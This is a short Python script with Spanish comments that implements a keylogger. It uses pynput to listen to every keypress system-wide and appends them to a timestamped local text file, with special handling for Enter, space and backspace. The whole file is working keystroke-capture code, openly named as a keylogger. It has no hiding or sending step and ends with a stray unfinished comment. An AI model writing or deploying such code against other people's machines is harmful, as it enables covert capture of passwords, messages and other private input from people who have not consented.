import datetime
from pynput.keyboard import Listener

# la fecha actual formateada
d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
# creo un file de name "keylogger<datetimestamp>.txt" en modo Write
f = open('keylogger_{}.txt'.format(d),'w')

def key_recorder(key):
  key=str(key)
  if key == "Key.enter":
    f.write('\n')
  elif key == "Key.space":
    f.write(' ')
  elif key == "Key.backspace":
    f.write('%BORRAR%')
  else:
    # le quitamos las comillas simples exteriores
    f.write(key.replace("'",""))
  

# En la clase Listener,si se da el evento on_press quiero que lo procese la funcion key_recorder.Lo guardo todo como 'l' 
with Listener(on_press=key_recorder) as l:
  l.join()
  
  # aqui gUU